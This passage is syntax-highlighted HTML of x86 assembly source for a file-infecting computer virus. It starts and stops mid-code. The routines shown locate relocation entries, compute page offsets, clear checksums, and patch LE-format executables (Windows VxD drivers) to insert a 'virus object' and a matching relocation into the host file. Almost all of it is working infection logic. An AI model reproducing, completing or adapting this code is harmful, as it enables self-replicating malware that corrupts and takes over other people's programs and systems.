                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IMAGE_RLC_ST_SOFF32</span><span class="sc4">+</span><span class="sc5">IMAGE_RLC_ST_CHAIN</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Skip_Reloc_List</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IMAGE_RLC_ST_OFF32</span><span class="sc4">+</span><span class="sc5">IMAGE_RLC_ST_CHAIN</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Find_Reloc_Fail</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.FR_chain.FC_obj</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Skip_Reloc_List</span><span class="sc0"> </span><span class="sc1">;Wrong object</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.FR_chain.FC_srccount</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Next_List_Reloc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">      </span><span class="sc5">Skip_Reloc_List</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Compare_List16</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_RLC_LISTSIZE32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Offset_Compared</span><span class="sc0">
</span><span class="sc5">Compare_List16</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_RLC_LISTSIZE16</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">Offset_Compared</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Next_List_Reloc</span><span class="sc0"> </span><span class="sc1">;Wrong source offset</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebx.FR_chain.FC_offset</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Find_Reloc_OK</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Skip_Reloc_List</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.FR_chain.FC_srccount</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc5">IMAGE_RLC_LISTSIZE16</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Go_Next_Reloc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Find_Reloc_Next</span><span class="sc0">
                </span><span class="sc1">;Add ebx,(IMAGE_RLC_INTSIZE32-IMAGE_RLC_INTSIZE16)=(IMAGE_RLC_LISTSIZE32\
                ;-IMAGE_RLC_LISTSIZE16)</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Find_Reloc_Next</span><span class="sc0">
</span><span class="sc5">Find_Reloc_Fail</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Calculate the file offset for a page</span><span class="sc0">
</span><span class="sc1">;ş On entry:</span><span class="sc0">
</span><span class="sc1">;  ECX=Page number</span><span class="sc0">
</span><span class="sc1">;  ESI=Pointer to LE header</span><span class="sc0">
</span><span class="sc1">;  LE_Info_Mem=Pointer to LE info (allocated memory)</span><span class="sc0">
</span><span class="sc1">;ş On exit:</span><span class="sc0">
</span><span class="sc1">;  EAX,ECX,EDX=?</span><span class="sc0">
</span><span class="sc1">;  * Carry flag clear:</span><span class="sc0">
</span><span class="sc1">;    EAX=Offset (within file) of page</span><span class="sc0">
</span><span class="sc1">;    ECX,EDX=?</span><span class="sc0">
</span><span class="sc1">;  * Carry flag set: ERROR</span><span class="sc0">
</span><span class="sc5">Get_Page_Offset</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_objmap</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Recalc</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.OPH_flags\
</span><span class="sc0">                </span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc5">IMAGE_SIZEOF_OBJECT_PAGE_HEADER</span><span class="sc4">],</span><span class="sc5">IMAGE_PAGE_VALID</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Get_Page_Offset_Fail</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.OPH_highpage</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc5">IMAGE_SIZEOF_OBJECT_PAGE_HEADER</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_pagesize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_datapage</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Get_Page_Offset_Fail</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Clear checksums</span><span class="sc0">
</span><span class="sc1">;ş On entry:</span><span class="sc0">
</span><span class="sc1">;  ESI=Pointer to LE header</span><span class="sc0">
</span><span class="sc1">;ş On exit:</span><span class="sc0">
</span><span class="sc1">;  EDX=0</span><span class="sc0">
</span><span class="sc1">;  Checksums cleared</span><span class="sc0">
</span><span class="sc5">Clear_Checksums</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_fixupsum</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_ldrsum</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_pagesum</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Update LE data, adding the virus object and the respective relocation</span><span class="sc0">
</span><span class="sc1">;ş On entry:</span><span class="sc0">
</span><span class="sc1">;  ESI=Pointer to LE header</span><span class="sc0">
</span><span class="sc1">;  EDI=File_Delta</span><span class="sc0">
</span><span class="sc1">;  LE_PE_Header_File=Offset (within file) of LE header</span><span class="sc0">
</span><span class="sc1">;  DDB_Offset_Obj=Offset of the DDB_Reserved3-1 field (in first object)</span><span class="sc0">
</span><span class="sc1">;  LE_Info_Mem=Pointer to LE info (allocated memory)</span><span class="sc0">
</span><span class="sc1">;  LE_Info_Size=Size of LE info</span><span class="sc0">
</span><span class="sc1">;ş On exit:</span><span class="sc0">
</span><span class="sc1">;  * Carry flag clear:</span><span class="sc0">
</span><span class="sc1">;    LE header updated</span><span class="sc0">
</span><span class="sc1">;    LE info updated</span><span class="sc0">
</span><span class="sc1">;    Virus_Object updated</span><span class="sc0">
</span><span class="sc1">;  * Carry flag set: ERROR</span><span class="sc0">
</span><span class="sc5">Update_LE</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_fpagetab</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_fixupsize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LE_PE_Header_File</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Virus_Physical_Size</span><span class="sc0">
                </span><span class="sc6">cdq</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_pagesize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Round_Size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">Round_Size</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_lastpagesize</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Virus_Object.OH_mapsize</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*(</span><span class="sc5">IMAGE_SIZEOF_OBJECT_PAGE_HEADER\
</span><span class="sc0">                </span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_FIXUP_PAGE_HEADER</span><span class="sc4">)+</span><span class="sc5">IMAGE_SIZEOF_OBJECT_HEADER\
</span><span class="sc0">                </span><span class="sc4">+</span><span class="sc5">IMAGE_RLC_INTSIZE16</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_datapage</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">Update_LE_Fail</span><span class="sc0"> </span><span class="sc1">;Not enough space for virus object and relocation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_mpages</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Virus_Object.OH_pagemap</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_objmap</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_OBJECT_HEADER</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Move_Data</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Virus_Object</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_OBJECT_HEADER</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsd</span><span class="sc0"> </span><span class="sc1">;Copy virus object</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_mpages</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;Shift left eax by "log2 IMAGE_SIZEOF_OBJECT_PAGE_HEADER"</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_objmap</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Virus_Object.OH_mapsize</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_mpages</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;Shift left ebx by "log2 IMAGE_SIZEOF_OBJECT_PAGE_HEADER"</span><span class="sc0">
                </span><span class="sc1">;="log2 IMAGE_SIZEOF_FIXUP_PAGE_HEADER"</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_ldrsize</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_ldrsize</span><span class="sc4">],</span><span class="sc5">IMAGE_SIZEOF_OBJECT_HEADER</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_fixupsize</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_fixupsize</span><span class="sc4">],</span><span class="sc5">IMAGE_RLC_INTSIZE16</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Move_Data</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Virus_Object.OH_pagemap</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
</span><span class="sc5">Fill_Object_Page</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
                </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.OPH_highpage</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_OBJECT_PAGE_HEADER</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Fill_Object_Page</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DDB_Offset_Obj</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;Offset (within first object) of relocation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Calculate_Page</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;Shift left ecx by "log2 IMAGE_SIZEOF_FIXUP_PAGE_HEADER"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_frectab</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Recalc</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_fpagetab</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Recalc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.FPH_offset</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Fix_Fixup_Page</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.FPH_offset</span><span class="sc4">],</span><span class="sc5">IMAGE_RLC_INTSIZE16</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_FIXUP_PAGE_HEADER</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">Fix_Fixup_Page</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_frectab</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Virus_Object.OH_mapsize</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;Shift left ebx by "log2 IMAGE_SIZEOF_FIXUP_PAGE_HEADER"</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Move_Data</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.FPH_offset</span><span class="sc4">-</span><span class="sc5">IMAGE_SIZEOF_FIXUP_PAGE_HEADER</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Fill_Fixup_Page</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.FPH_offset</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc5">IMAGE_SIZEOF_FIXUP_PAGE_HEADER\
</span><span class="sc0">                </span><span class="sc4">-</span><span class="sc5">IMAGE_SIZEOF_FIXUP_PAGE_HEADER</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Fill_Fixup_Page</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_frectab</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">IMAGE_RLC_INTSIZE16</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Move_Data</span><span class="sc0">
                </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,(</span><span class="sc5">FR_fixup.FH_soff</span><span class="sc4">)*</span><span class="sc2">8</span><span class="sc0">
